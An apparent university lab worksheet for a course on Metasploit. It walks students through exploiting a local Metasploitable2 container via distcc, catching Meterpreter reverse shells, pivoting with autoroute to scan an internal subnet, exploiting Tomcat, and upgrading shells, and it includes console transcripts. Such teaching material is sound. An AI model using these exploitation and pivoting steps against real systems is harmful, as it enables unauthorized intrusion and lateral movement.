<img src="https://www.tamusa.edu/brandguide/jpeglogos/tamusa_final_logo_bw1.jpg" width="200" height="100"> 

# Metasploit II
This lab can be performed on an e2-small GCP instance. However, performance degrades significantly with two or more Meterpreter shells. Options to improve performance include:
1. Stop your GCP instance and edit Machine type to e2-medium. Resize the instance to e2-small or stop the instance after the lab is complete.
2. Install Docker on a local Kali VM and complete the lab on a local Kali VM. Note, Kali is based on Debian, so use Debian instructions to install Docker Engine on Kali. Either of the following guides will work: [Install Docker Engine on Debian](https://docs.docker.com/engine/install/debian/) or [Installing Docker on Kali Linux](https://www.kali.org/docs/containers/installing-docker-on-kali/).

## Challenge 1: Deploy the Lab
The following script prepares a custom Metasploitable2. Copy the script and run it or run the commands individually.
```
#!/bin/bash
cd ~
mkdir metasploitable2
mkdir metasploitable2/tomcat
cd ~/metasploitable2
wget https://raw.githubusercontent.com/kabarton62/cybersec-tools-I/main/metasploit/lab2/deploy.sh
wget -P ~/metasploitable2/tomcat https://raw.githubusercontent.com/kabarton62/cybersec-tools-I/main/metasploit/lab2/tomcat/server.xml
bash deploy.sh
sleep 10
nmap 172.17.0.0/24 -p-
```
Copy the above script. Create a file (i.e., build.sh) and paste the script. Run the script.

**Capture a screenshot of the nmap results**

## Challenge 2: Exploit distcc
1. Exploit Metasploitable2 via distcc.
- Find the related exploit module
- Configure RHOSTS
- Set the payload for set **payload cmd/unix/reverse**
2. Create a Meterpreter reverse shell. Use the IP address for a Kali Linux that can catch the Meterpreter shell as the LHOST.
3. In a second terminal, prepare and start a Metasploit multi/handler on Kali.
4. Use the Metasploit-Framework distcc exploit to:
- Transfer the Meterpreter reverse shell to Metasploitable2
- Change file permissions on the Meterpreter reverse shell
- Execute the Meterpreter reverse shell
5. Verify that a Meterpreter shell was caught on the multi/handler.
6. Close the initial session (non-Meterpreter session) from the distcc exploit.

**Capture screenshots that prove the Meterpreter reverse shell was transferred, had file permissions changed, and executed using the distcc exploit.**

## Challenge 3: Pivoting with Metasploitable2
Tomcat was reconfigured. TCP 8180 is listening on a single interface. We will use the session from the Metepreter shell we caught on the Metasploit multi/handler to pivot through Metasploitable2. _Pivoting_ refers to the process of using an exploited host to pivot network traffic through to discover and attack hosts that can only be reached from the exploited host.

The following shows an example. In this example, the Meterpreter shell is session 5. Your session will likely be different.
```
meterpreter > run autoroute -s 192.168.100.0/24

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 192.168.100.0/255.255.255.0...
[-] Could not add route
[*] Use the -p option to list all active routes
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.168.100.0      255.255.255.0      Session 5

meterpreter > 
```

Prepare a pivot. **The target SUBNET is 192.168.100.0/24.** You will see errors, but the command **run autoroute -p** should confirm that routing was added to 192.168.100.0/24.

**Background** your current session.

Next, use another Metasploit-Framework module, **auxiliary/scanner/portscan/tcp**, to run a port scan through the pivot. Two options need to be configured: **PORTS** and **RHOSTS**. Configure PORTS and RHOSTS as shown below.

```
msf6 auxiliary(scanner/portscan/tcp) > options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting   Required  Description
   ----         ---------------   --------  -----------
   CONCURRENCY  10                yes       The number of concurrent ports to check per host
   DELAY        0                 yes       The delay between connections, per thread, in milli
                                            seconds
   JITTER       0                 yes       The delay jitter factor (maximum value by which to
                                            +/- DELAY) in milliseconds.
   PORTS        8180              yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS       192.168.100.0/24  yes       The target host(s), see https://github.com/rapid7/m
                                            etasploit-framework/wiki/Using-Metasploit
   THREADS      1                 yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000              yes       The socket connect timeout in milliseconds
   ```
   **Run the port scan and capture a screenshot of the scan results**. The discovered host is the RHOST for tomcat.

### Challenge 4: Exploit tomcat through the Pivot
Recall that we previously used **exploit/multi/http/tomcat_mgr_upload** to exploit [CVE 2009-3548](https://nvd.nist.gov/vuln/detail/CVE-2009-3548). 

Exploit tomcat again, but recall that the RHOSTS must be the IP address discovered in the port scan.

**Capture a screenshot of the exploit against tomcat.**

### Challenge 5: Kill all Sessions
Use the command sessions -K to kill all sessions. Meterpreter sessions degrade performance in the lightweight GCP instances. Therefore, we will kill sessions that are no longer needed.

```
msf6 exploit(multi/http/tomcat_mgr_upload) > sessions -K
[*] Killing all sessions...
[*] 192.168.100.15 - Meterpreter session 2 closed.  Reason: Died
[*] 192.168.100.15 - Meterpreter session 2 closed.
[*] 172.17.0.3 - Meterpreter session 1 closed.
msf6 exploit(multi/http/tomcat_mgr_upload) > 
```

### Challenge 6: Sessions
Metasploit can simultaneously manage multiple active _sessions_. The **jobs** command will list jobs running in the background but does not enable interaction with the associated session. The **sessions** command is used to list, interact with, and kill sessions. Sessions can be standard shells, Meterpreter shells, or other types of command line interfaces with targets. We covered the basics of the **sessions** command, but advanced options can be very useful during a penetration test or other operational use of Metasploit. Additional reading can be found at [Offensive Security](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/) and [Hacking Articles](https://www.hackingarticles.in/metasploit-for-pentester-sessions/).

One feature that can be useful is the ability to upgrade a non-Meterpreter shell to a Meterpreter shell. The following example illustrates upgrading a Unix shell to a Meterpreter shell.

```
msf6 > search distcc

Matching Modules
================

   #  Name                           Disclosure Date  Rank       Check  Description
   -  ----                           ---------------  ----       -----  -----------
   0  exploit/unix/misc/distcc_exec  2002-02-01       excellent  Yes    DistCC Daemon Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/misc/distcc_exec

msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/reverse_bash
msf6 exploit(unix/misc/distcc_exec) > set rhosts 172.17.0.3
rhosts => 172.17.0.3

msf6 exploit(unix/misc/distcc_exec) > set payload cmd/unix/reverse
payload => cmd/unix/reverse

msf6 exploit(unix/misc/distcc_exec) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP double handler on 172.17.0.2:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
msf6 exploit(unix/misc/distcc_exec) > [*] Command: echo LzhD0jeHdqJaNcwJ;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "LzhD0jeHdqJaNcwJ\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 2 opened (172.17.0.2:4444 -> 172.17.0.3:59870) at 2022-11-14 16:04:24 +0000

msf6 exploit(unix/misc/distcc_exec) > sessions 

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  2         shell cmd/unix               172.17.0.2:4444 -> 172.17.0.3:59870 (
                                         172.17.0.3)

msf6 exploit(unix/misc/distcc_exec) > sessions -u 2
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [2]

[*] Upgrading session ID: 2
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 172.17.0.2:4433 
[*] Sending stage (1017704 bytes) to 172.17.0.3
[*] Command stager progress: 100.00% (773/773 bytes)
msf6 exploit(unix/misc/distcc_exec) > sessions

Active sessions
===============

  Id  Name  Type                  Information          Connection
  --  ----  ----                  -----------          ----------
  2         shell cmd/unix                             172.17.0.2:4444 -> 172.
                                                       17.0.3:59870 (172.17.0.
                                                       3)
  3         meterpreter x86/linu  daemon @ 172.17.0.3  172.17.0.2:4433 -> 172.
            x                                          17.0.3:60874 (172.17.0.
                                                       3)

msf6 exploit(unix/misc/distcc_exec) >
```

Repeat the steps above. 
1. Use **exploit/unix/misc/distcc_exec**
2. Set payload to **cmd/unix/reverse**
3. Set rhosts to target Metasploitable2
4. Run the attack and backgound the resulting session with the command **run -j**
5. Upgrade the session to a Meterpreter shell with command **sessions -u 2** (use the appropriate session number)

**Capture a screenshot showing the cmd/unix and Meterpreter sessions on distcc.**

### Challenge 7: Kill all Sessions
The command was covered in Challenge 5.
